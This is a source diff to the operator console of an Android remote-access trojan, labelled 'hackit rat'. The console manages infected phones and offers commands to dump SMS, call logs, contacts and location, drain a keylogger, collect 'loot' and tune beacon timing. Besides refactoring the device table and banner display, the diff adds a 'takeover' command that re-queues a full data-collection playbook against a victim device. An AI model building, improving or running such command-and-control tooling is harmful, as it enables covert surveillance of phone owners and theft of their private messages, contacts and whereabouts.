@@ -16,7 +16,7 @@ from typing import Dict, List, Optional
 
 from hackit.ui import _colored, B_CYAN, B_GREEN, B_MAGENTA, B_WHITE, DIM, GREEN, RED, YELLOW
 
-from . import protocol, store
+from . import protocol, store, term
 from .server import Hub, make_app
 
 HELP = [
@@ -35,18 +35,17 @@ HELP = [
     ("shot", "screen capture (needs consent)"),
     ("sms [n] / calls / contacts / loc", "dump data"),
     ("keylog", "drain the keylogger buffer"),
+    ("takeover", "re-run the full collection playbook"),
     ("sleep <ms>", "set the beacon interval"),
     ("loot", "downloaded artifacts"),
     ("open <token>", "open a looted artifact"),
     ("help / quit", "this list / exit"),
 ]
 
-BANNER = r"""
-  ┌──────────────────────────────────────────────┐
-  │  hackit rat · operator console                │
-  │  help for verbs · quit to drop                │
-  └──────────────────────────────────────────────┘
-"""
+BANNER = [
+    "hackit rat · operator console",
+    "help for verbs · quit to drop",
+]
 
 
 class Console:
@@ -107,15 +106,21 @@ class Console:
         if not rows:
             print(_colored("  no devices yet — build an apk and install it", DIM))
             return
+        width, _ = term.size()
+        table = []
         for index, row in enumerate(rows, 1):
-            dot = _colored("●", GREEN) if row["online"] else _colored("○", DIM)
-            mark = _colored("*", B_MAGENTA) if row["sid"] == self.sid else " "
-            print(
-                f" {mark}{index:>2} {dot} {_colored(row['label'], B_WHITE)}"
-                f"  {row.get('model') or '?'}  sdk {row.get('sdk')}"
-                f"  {row.get('battery') or 0}%{'⚡' if row.get('charging') else ''}"
-                f"  {_colored('last ' + age(row['last_seen']), DIM)}"
-            )
+            dot = term.Good + "●" + term.RESET if row["online"] else term.Dim + "○" + term.RESET
+            mark = term.Accent + "*" + term.RESET if row["sid"] == self.sid else " "
+            table.append([
+                f"{mark}{index:>2}", dot, (row.get("spec") or "rat")[:8],
+                (row.get("label") or "?")[:18], (row.get("model") or "?")[:20],
+                f"{row.get('battery') or 0}%{'⚡' if row.get('charging') else ''}",
+                age(row["last_seen"]),
+            ])
+        for line in term.table(("", "#", "", "spec", "label", "model", "batt", "last"), table,
+                               (1, 3, 1, 8, 18, 20, 6, 5),
+                               ("left", "right", "center", "left", "left", "left", "right", "right")):
+            print("  " + term.trunc(line, width - 2))
 
     def poll_once(self) -> None:
         sid = self.require()
@@ -207,9 +212,12 @@ def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) ->
     store.init()
     terminal = Console(host, port, psk, public_url, udp_port)
     terminal.start()
-    print(_colored(BANNER, B_CYAN))
-    print(f"  listen {host}:{port}   token {terminal.hub.token}")
-    print(f"  share the build config: host={public_url} psk=<from key file>\n")
+    for line in term.box("OPERATOR CONSOLE", BANNER, 52, term.Frame):
+        print("  " + line)
+    print("  " + term.label("listen", 10) + term.Bright + f"{host}:{port}" + term.RESET)
+    print("  " + term.label("token", 10) + term.Dim + terminal.hub.token + term.RESET)
+    print("  " + term.label("host", 10) + term.Dim + public_url + term.RESET)
+    print()
 
     while True:
         try:
@@ -229,7 +237,7 @@ def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) ->
                 break
             elif verb in ("help", "?"):
                 for name, desc in HELP:
-                    print(f"  {_colored(name.ljust(34), B_WHITE)} {_colored(desc, DIM)}")
+                    print("  " + term.pad(term.Bright + name + term.RESET, 34) + term.Dim + desc + term.RESET)
             elif verb in ("sessions", "ls"):
                 terminal.show_sessions()
             elif verb == "use":
@@ -293,6 +301,15 @@ def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) ->
                     store.touch(sid, sleep_ms=int(args[0]))
                     terminal.hub.wake(sid)
                     print(_colored(f"  sleep {args[0]} ms", DIM))
+            elif verb == "takeover":
+                sid = terminal.require()
+                if sid:
+                    store.release_takeover(sid)
+                    from . import server as c2
+
+                    queued = c2.auto_takeover(terminal.hub, sid)
+                    terminal.hub.wake(sid)
+                    print(_colored(f"  takeover re-queued ({queued} steps)", GREEN))
             elif verb == "loot":
                 terminal.print_loot()
             elif verb == "open":
